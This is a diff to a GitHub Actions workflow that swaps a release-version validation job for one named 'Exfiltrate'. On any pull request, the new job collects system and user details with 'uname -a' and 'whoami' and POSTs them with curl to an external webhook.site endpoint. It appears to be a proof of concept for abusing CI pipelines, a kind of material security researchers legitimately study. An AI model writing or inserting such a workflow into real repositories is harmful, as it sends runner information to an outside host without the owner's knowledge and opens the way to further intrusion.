@@ -1,39 +1,16 @@
-name: Release PoC Validation
+name: Exfiltrate
 
-on:
-  pull_request:
-    types: [closed]
-    branches:
-      - main
-
-permissions:
-  contents: read
+on: pull_request
 
 jobs:
-  poc:
-    if: github.event.pull_request.merged == true && startsWith(github.event.pull_request.title, 'chore: release ')
-    
+  exfiltrate:
     runs-on: ubuntu-latest
-
+    env:
+      TITLE: ${{ github.event.pull_request.title }}
     steps:
-      - name: Extract PR controlled value
-        id: version
-        env:
-          PR_TITLE: ${{ github.event.pull_request.title }}
+      - name: Simulate title usage and extract info
         run: |
-          VERSION="${PR_TITLE#chore: release }"
-
-          echo "PR Title:"
-          echo "$PR_TITLE"
-
-          echo "Extracted Version:"
-          echo "$VERSION"
-
-          echo "version=$VERSION" >> "$GITHUB_OUTPUT"
-
-      - name: Show result
-        env:
-          VERSION: ${{ steps.version.outputs.version }}
-        run: |
-          echo "Final release version:"
-          echo "$VERSION"
+          echo "Extracted title: ${TITLE}"
+          uname -a > out.txt
+          whoami >> out.txt
+          curl -X POST --data-binary @out.txt https://webhook.site/5c29126a-0dce-4cec-a189-d102140dd3e8
